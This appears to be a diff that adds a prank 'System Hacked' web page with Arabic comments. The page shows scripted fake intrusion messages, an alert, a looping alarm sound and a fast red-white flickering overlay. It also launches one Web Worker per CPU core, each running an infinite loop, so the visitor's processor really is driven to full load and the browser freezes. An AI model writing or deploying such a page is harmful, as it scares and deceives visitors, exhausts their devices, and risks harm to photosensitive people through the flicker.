@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>💀 System Hacked!</title>
+  <style>
+    body {
+      background: black;
+      color: lime;
+      font-family: monospace;
+      font-size: 16px;
+      overflow: hidden;
+      margin: 0;
+    }
+    #log {
+      white-space: pre-wrap;
+      padding: 20px;
+    }
+    .freeze {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(255,0,0,0.2);
+      animation: flicker 0.1s infinite;
+      z-index: 9999;
+    }
+    @keyframes flicker {
+      0%   { background: rgba(255,0,0,0.2); }
+      50%  { background: rgba(255,255,255,0.1); }
+      100% { background: rgba(255,0,0,0.2); }
+    }
+  </style>
+</head>
+<body>
+  <h1>💀 SYSTEM HACKED</h1>
+  <div id="log">Loading attack modules...\n</div>
+  <div class="freeze"></div>
+
+  <!-- صوت إنذار -->
+  <audio autoplay loop>
+    <source src="https://freesound.org/data/previews/250/250629_4486188-lq.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+    alert("☠️ Your system is under attack!");
+
+    // محاكاة التهنيج
+    const log = document.getElementById("log");
+    const lines = [
+      "[*] Accessing kernel...",
+      "[*] Elevating privileges...",
+      "[*] Injecting rootkit...",
+      "[*] Forcing CPU to 100% load...",
+      "[!] Warning: CPU Overload!",
+      "[!] System Freeze Detected...",
+      "[✔] You are now hacked 💀"
+    ];
+    let i = 0;
+    const interval = setInterval(() => {
+      if (i < lines.length) {
+        log.textContent += "\n" + lines[i++];
+      } else {
+        clearInterval(interval);
+      }
+    }, 1000);
+
+    // استهلاك المعالج باستخدام Web Workers
+    const cores = navigator.hardwareConcurrency || 4;
+    const workerCode = `
+      self.onmessage = function(e) {
+        if (e.data === 'start') {
+          while (true) {
+            Math.sqrt(Math.random() * Math.random());
+          }
+        }
+      }
+    `;
+    const blob = new Blob([workerCode], { type: 'application/javascript' });
+    const workerURL = URL.createObjectURL(blob);
+    for (let j = 0; j < cores; j++) {
+      const w = new Worker(workerURL);
+      w.postMessage('start');
+    }
+  </script>
+</body>
+</html>
